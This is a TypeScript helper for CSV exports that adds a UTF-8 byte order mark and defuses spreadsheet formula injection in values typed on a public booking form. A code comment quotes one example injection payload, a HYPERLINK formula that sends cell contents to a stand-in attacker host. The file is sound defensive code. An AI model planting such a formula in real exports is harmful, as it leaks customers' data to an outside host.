/**
 * CSV for files a business opens in a spreadsheet. Shared by every export.
 */

/** Excel reads a file without this as a legacy code page, garbling "Peña". */
export const UTF8_BOM = "﻿";

/** A cell starting with one of these runs as a formula in a spreadsheet. */
const FORMULA_START = /^[\s=+\-@＝＋－＠]/;

/** Digits and separators cannot call anything, so "+52 55…" can stay as typed. */
const PHONE_NUMBER = /^\+[\d\s().-]+$/;

/**
 * Every value here was typed by a stranger on a public booking form, and the
 * file is opened by the provider in a spreadsheet. A name like
 * `=HYPERLINK("http://evil.example?"&A2)` would otherwise run on their machine.
 */
function neutralizeFormula(value: string) {
  return FORMULA_START.test(value) && !PHONE_NUMBER.test(value) ? `'${value}` : value;
}

export function csvCell(value: string) {
  const safe = neutralizeFormula(value);
  return /[",\r\n]/.test(safe) ? `"${safe.replace(/"/g, '""')}"` : safe;
}
